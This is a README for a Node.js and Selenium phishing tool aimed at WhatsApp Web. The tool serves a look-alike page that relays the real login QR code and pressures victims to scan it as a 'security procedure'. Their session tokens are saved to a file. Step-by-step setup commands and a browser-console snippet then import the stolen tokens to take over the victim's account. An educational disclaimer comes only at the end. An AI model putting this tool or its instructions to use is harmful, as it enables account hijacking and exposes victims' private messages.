#Whatsapp phishing

This repository contains code writen in node.js for running a phishing attack against the official [Whatsapp Web client](https://web.whatsapp.com).
Idea was originally taken from [German blog](http://blog.mawalabs.de/whatsapp-phishing/).

A web client for Whatsapp.Allows user to log in by scanning a QR code on there page using Whatsapp

##What does it do

It extracts the QR code from [Whatsapp Web](https://web.whatsapp.com) and display it on a new page.
If someone scans the code using Whatsapp it will grab the credentials from the web client and save them in a file.
Those credentials can be used to log yourself in as the person who scanned to QR code.

Phishing page encourages user to scan QR code by telling them that is normal security procedure. The phishing page is build to look exactly same as the original page

##How does it work

The program uses node.js and socket.io for the website and selenium, a tool for scripting browsers, to communicate with the Whatsapp web client.

The program starts a http and a socket.io server. If a new client connects to socket.io the application will make a request to a selenium instance to start a new browser and connect to web.whatsapp.com. It will fetch the QR code data and send it to the client via the websocket connection. The client javascript then shows the QR code to the user.

If the QR code gets scanned Whatsapp will authenticate the selenium controlled browser and store some tokens in the localStorage and document.cookie. We extract that data and save it into a text file. It will look like so:

```
{
   "s":{
      "remember-me":"true",
      "WAVersion":"\"0.1.4391\"",
      "qwefsdafadsdf==":"false",
      "debugCursor":"146",
      "WAWamDimensionCache":"{\"AppVersion\":\"0.1.4391\",\"BrowserVersion\":\"Firefox 39.0\",\"DeviceName\":\"Linux x86_64\",\"WebcEnv\":0}",
      "WAToken2":"\"0.asldkamäsdflkasdfasdf\"",
      "WAWamLastRotate":"1439140177924",
      "WALangPref":"\"de-DE\"",
      "WAWamStatus":"\"completed\"",
      "y8fY/zQ8P+asdfadfg==":"[
        ...
      ]",
      "WAToken1":"\"asdf+ams,dfhlaskdjfhasdfasdf=\"",
      "Dexie.DatabaseNames":"[\"wawc\"]",
      "storage_test":"storage_test",
      "LKAJsdlksdjfasdf==":"false",
      "logout-token":"\"alkjsdhfkjashldkjpweoaLKNKASBkasjbdaksdjLKjhhndosiaosa;AljkhJKhlKAJShkljqjDJSAOlkjbnhasdklWAdm==\"",
      "ver":"1",
      "whatsapp-mutex":"\"x781239870495:init0.987123490234\"",
      "WASecretBundle":"{\"key\":\"sldkfjsdf+asdlfijlasdkjfasdf=\",\"encKey\":\"asldkfjasldkfjsdfsdf0=\",\"macKey\":\"a,sdfasdf+alskdjföalskdhiopasdf=\"}",
      "WABrowserId":"\"aö,ksdjflöasdf==\""
   },
   "c":""
}
```

You can than import these tokens into your browser and log in as the person who scanned the QR code.

##Instructions

   * Type the following into your terminal
   
    ```
    $ java -jar selenium-server.jar

    # new terminal
    $ git clone https://github.com/carbonWebber/whatsapp-phishing-script.git
    $ cd whatsapp-phishing
    $ npm install
    $ node index.js
    ```
   * Open your browser and go to [http://localhost:8080](http://localhost:8080)
   * Start Whatsapp on your smartphone, go to Menu > Whatsapp Web and scan the QR code from your browser.
   * Copy the content from the newly created secrets file
   * Open web.whatsapp.com. (Watch out that you are not already logged in, maybe use incognito mode)
   * Open your developer console
   * Enter the following code:
   
   ```
   > var t = CONTENT_OF_YOUR_SECRETS_FILE
   > function login(token) {Object.keys(token.s).forEach(function (key) {localStorage.setItem(key, token.s[key])}); token.c = token.c.split(';'); token.c.forEach(function(cookie) {document.cookie = cookie; });}
   > login(t)
   ```
   * Reload the page
   * You should be logged in as the person who scanned the QR code

##Disclaimer

Just for educational purposes, I created a web WhatsApp phishing script using Selenium and Node.js.
The script has potential to steal users web WhatsApp tokens, by asking them to scan a QR code by asking them anything like win a prize by scanning or verify your security by scanning.

The following script was used in cyber safety workshop, addressing young generation about potential privacy security issues in today's life style. 

Special thanks to [Mawalu](https://github.com/Mawalu/whatsapp-phishing)`s repository from where this project was forked
